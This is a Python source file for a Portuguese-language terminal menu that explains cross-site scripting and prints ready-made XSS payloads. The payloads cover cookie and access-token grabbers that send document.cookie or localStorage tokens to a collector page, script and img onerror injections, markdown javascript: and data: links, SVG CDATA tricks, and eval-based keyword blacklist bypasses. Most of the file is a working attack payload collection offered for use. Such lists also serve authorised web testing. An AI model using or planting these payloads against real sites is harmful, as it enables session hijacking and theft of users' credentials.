# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Funçao do XSS


def fun_xss():
    while True:
        system('clear')
        print("""
                        ═╗ ╦╔═╗╔═╗
                        ╔╩╦╝╚═╗╚═╗
                        ╩ ╚═╚═╝╚═╝\n
- Os Ataques Cross-site Scripting (Xss) São Um Tipo De Injeção, Na Qual Scripts Maliciosos São Injetados Em Sites Benignos E Confiáveis. Os Ataques Xss Ocorrem Quando Um Invasor Usa Um Aplicativo Da Web Para Enviar Código Malicioso, Geralmente Na Forma De Um Script Do Lado Do Navegador, Para Um Usuário Final Diferente.
As Falhas Que Permitem Que Esses Ataques Sejam Bem-sucedidos São Bastante Difundidas E Ocorrem Em Qualquer Lugar Em Que Um Aplicativo Da Web Usa A Entrada De Um Usuário Na Saída Que Gera Sem Validá-la Ou Codificá-la.\n
    [01] - Agarrador De Dados Para Xss
    [02] - Xss Em Html/aplicativos
    [03] - Xss Em Markdown
    [04] - Xss Em Svg(Curto)
    [05] - Ignorar Lista Negra De Palavras Com Avaliação De Código
    [06] - Menu 
    [99] - Sair
        """)
        cmd = str(input("===> "))
        if cmd == '1':
            system('clear')
            print("""
    ╔═╗╔═╗╔═╗╦═╗╦═╗╔═╗╔╦╗╔═╗╦═╗  ╔╦╗╔═╗  ╔╦╗╔═╗╔╦╗╔═╗╔═╗  ╔═╗╔═╗╦═╗╔═╗  ═╗ ╦╔═╗╔═╗                                                                
    ╠═╣║ ╦╠═╣╠╦╝╠╦╝╠═╣ ║║║ ║╠╦╝   ║║║╣    ║║╠═╣ ║║║ ║╚═╗  ╠═╝╠═╣╠╦╝╠═╣  ╔╩╦╝╚═╗╚═╗                                                                
    ╩ ╩╚═╝╩ ╩╩╚═╩╚═╩ ╩═╩╝╚═╝╩╚═  ═╩╝╚═╝  ═╩╝╩ ╩═╩╝╚═╝╚═╝  ╩  ╩ ╩╩╚═╩ ╩  ╩ ╚═╚═╝╚═╝\n

    - Obtém O Cookie Do Administrador Ou Token De Acesso Confidencial, A Seguinte Carga O Enviará Para Uma Página Controlada.

    > <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
    > <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
    > <script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
    > <script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_xss()
            break
        elif cmd == '2':
            system('clear')
            print("""
    ═╗ ╦╔═╗╔═╗  ╔═╗╔╦╗  ╦ ╦╔╦╗╔╦╗╦    ╔═╗  ╔═╗╔═╗╦  ╦╔═╗╔═╗╔╦╗╦╦  ╦╔═╗╔═╗  
    ╔╩╦╝╚═╗╚═╗  ║╣ ║║║  ╠═╣ ║ ║║║║    ║╣   ╠═╣╠═╝║  ║║  ╠═╣ ║ ║╚╗╔╝║ ║╚═╗  
    ╩ ╚═╚═╝╚═╝  ╚═╝╩ ╩  ╩ ╩ ╩ ╩ ╩╩═╝  ╚═╝  ╩ ╩╩  ╩═╝╩╚═╝╩ ╩ ╩ ╩ ╚╝ ╚═╝╚═╝  \n

    > <script>alert('XSS')</script>
    > <scr<script>ipt>alert('XSS')</scr<script>ipt>
    > "><script>alert("XSS")</script>
    > "><script>alert(String.fromCharCode(88,83,83))</script>
    > <img src=x onerror=alert('XSS');>
    > <img src=x onerror=alert('XSS')//
    > <img src=x onerror=alert(String.fromCharCode(88,83,83));>
    > <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
    > <img src=x:alert(alt) onerror=eval(src) alt=xss>
    > "><img src=x onerror=alert("XSS");>
    > "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_xss()
            break
        elif cmd == '3':
            system('clear')
            print("""
    ═╗ ╦╔═╗╔═╗  ╔═╗╔╦╗  ╔╦╗╔═╗╦═╗╦╔═╔╦╗╔═╗╦ ╦╔╗╔                                                                                                  
    ╔╩╦╝╚═╗╚═╗  ║╣ ║║║  ║║║╠═╣╠╦╝╠╩╗ ║║║ ║║║║║║║                                                                                                  
    ╩ ╚═╚═╝╚═╝  ╚═╝╩ ╩  ╩ ╩╩ ╩╩╚═╩ ╩═╩╝╚═╝╚╩╝╝╚╝ \n

    > [a](javascript:prompt(document.cookie))
    > [a](j a v a s c r i p t:prompt(document.cookie))
    > [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
    > [a](javascript:window.onerror=alert;throw%201)
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_xss()
            break

        elif cmd == '4':
            system('clear')
            print("""
    ═╗ ╦╔═╗╔═╗  ╔═╗╔╦╗  ╔═╗╦  ╦╔═╗  ╔═╗╦ ╦╦═╗╔╦╗╔═╗                                                                                               
    ╔╩╦╝╚═╗╚═╗  ║╣ ║║║  ╚═╗╚╗╔╝║ ╦  ║  ║ ║╠╦╝ ║ ║ ║                                                                                               
    ╩ ╚═╚═╝╚═╝  ╚═╝╩ ╩  ╚═╝ ╚╝ ╚═╝  ╚═╝╚═╝╩╚═ ╩ ╚═╝\n  

    > <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
    > <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
    > <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
    > <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_xss()
            break

        elif cmd == '5':
            system('clear')
            print("""
    ╦╔═╗╔╗╔╔═╗╦═╗╔═╗╦═╗  ╦  ╦╔═╗╔╦╗╔═╗  ╔╗╔╔═╗╔═╗╦═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦  ╔═╗╦  ╦╦═╗╔═╗╔═╗  ╔═╗╔═╗╔╦╗  ╔═╗╦  ╦╔═╗╦  ╦╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔╦╗╦╔═╗╔═╗
    ║║ ╦║║║║ ║╠╦╝╠═╣╠╦╝  ║  ║╚═╗ ║ ╠═╣  ║║║║╣ ║ ╦╠╦╝╠═╣   ║║║╣   ╠═╝╠═╣║  ╠═╣╚╗╔╝╠╦╝╠═╣╚═╗  ║  ║ ║║║║  ╠═╣╚╗╔╝╠═╣║  ║╠═╣║ ║   ║║║╣   ║   ║║║║ ╦║ ║
    ╩╚═╝╝╚╝╚═╝╩╚═╩ ╩╩╚═  ╩═╝╩╚═╝ ╩ ╩ ╩  ╝╚╝╚═╝╚═╝╩╚═╩ ╩  ═╩╝╚═╝  ╩  ╩ ╩╩═╝╩ ╩ ╚╝ ╩╚═╩ ╩╚═╝  ╚═╝╚═╝╩ ╩  ╩ ╩ ╚╝ ╩ ╩╩═╝╩╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝═╩╝╩╚═╝╚═╝\n

    > eval('ale'+'rt(0)');
    > Function('ale'+'rt(1)')();
    > new Function`alert`6``;
    > setTimeout('ale'+'rt(2)');
    > setInterval('ale'+'rt(10)');
    > Set.constructor('ale'+'rt(13)')();
    > Set.constructor`alert(14)```;
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_xss()
            break

        elif cmd == '6':
            break

        elif cmd == '99':
            print("Até logo...")
            exit()
        else:
            print("Comando Inválido!!!")
            sleep(2)
